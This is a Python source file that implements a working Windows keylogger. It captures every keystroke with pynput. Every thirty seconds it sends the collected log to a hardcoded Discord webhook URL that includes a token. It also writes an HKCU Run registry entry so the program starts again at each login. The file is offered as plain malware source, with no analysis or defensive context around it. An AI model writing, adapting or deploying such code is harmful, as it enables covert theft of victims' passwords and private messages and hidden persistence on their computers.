from dhooks import Webhook
from threading import Timer
from pynput.keyboard import Listener
import winreg
import os


WEBHOOK_URL = 'https://discord.com/api/webhooks/1119333967980679218/Th_zESq80saKWwJzVE8lpT0xjSKSj5LKT-e228uC1-GJYOs4ApaNm8i1syAnaOFSLK4E'
TIME_INTERVAL = 30  # Amount of time between each report, expressed in seconds.
KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
VALUE_NAME = "test"
VALUE_DATA = os.path.join(os.path.dirname(os.path.abspath(__file__)), "test.exe")

class Keylogger:
    def __init__(self, webhook_url, interval):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _report(self):
        if self.log != '':
            self.webhook.send(self.log)
            self.log = ''
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        self.log += f'{str(key)}\n'

    def run(self):
        self._report()
        with Listener(self._on_key_press) as t:
            t.join()

def add_registry_entry(key_path, value_name, value_data):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
        winreg.CloseKey(key)
        print("Wpis został dodany do rejestru.")
    except Exception as e:
        print("Wystąpił błąd podczas dodawania wpisu do rejestru:", e)



if __name__ == '__main__':
    add_registry_entry(KEY_PATH, VALUE_NAME, VALUE_DATA)

    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()